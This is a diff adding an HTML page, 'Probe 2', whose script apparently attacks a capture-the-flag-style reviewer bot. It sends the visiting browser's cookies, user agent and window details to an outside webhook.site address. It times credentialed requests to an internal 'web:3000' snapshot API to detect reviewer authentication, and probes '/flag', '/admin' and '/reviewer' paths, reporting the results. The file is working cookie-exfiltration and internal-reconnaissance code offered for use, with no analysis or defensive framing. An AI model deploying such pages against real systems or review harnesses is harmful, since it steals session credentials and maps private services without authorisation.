@@ -1,0 +1,21 @@
+<!doctype html><html><head><title>Probe 2</title></head><body><h1>probe2</h1><script>
+const W='https://webhook.site/9f7f9d67-ed2e-4901-8c1e-c408e2810001';
+const L=(t,d)=>navigator.sendBeacon(W+'?ev='+t+'&d='+encodeURIComponent(JSON.stringify(d||{})));
+L('p2-start',{ua:navigator.userAgent.slice(0,50),dpr:devicePixelRatio,w:innerWidth,h:innerHeight,f:document.hasFocus(),vis:document.visibilityState,ck:document.cookie});
+(async()=>{
+ // timing side-channel: does the checker browser carry reviewer auth to web:3000?
+ let t0=performance.now();
+ try{await fetch('http://web:3000/api/snapshot',{method:'POST',mode:'no-cors',credentials:'include',headers:{'Content-Type':'text/plain;charset=UTF-8'},body:JSON.stringify({url:'http://192.0.2.1/'})});}catch(e){}
+ let d1=performance.now()-t0;
+ t0=performance.now();
+ try{await fetch('http://web:3000/api/snapshot',{method:'POST',mode:'no-cors',credentials:'omit',headers:{'Content-Type':'text/plain;charset=UTF-8'},body:JSON.stringify({url:'http://192.0.2.1/'})});}catch(e){}
+ let d2=performance.now()-t0;
+ L('timing',{withCreds:Math.round(d1),noCreds:Math.round(d2)});
+ // reachability of likely flag paths (opaque, timing only)
+ for (const p of ['/flag','/admin','/reviewer']) {
+   let s=performance.now(); try{await fetch('http://web:3000'+p,{mode:'no-cors'});}catch(e){}
+   L('path-'+p,{ms:Math.round(performance.now()-s)});
+ }
+ L('p2-done');
+})();
+</script></body></html>
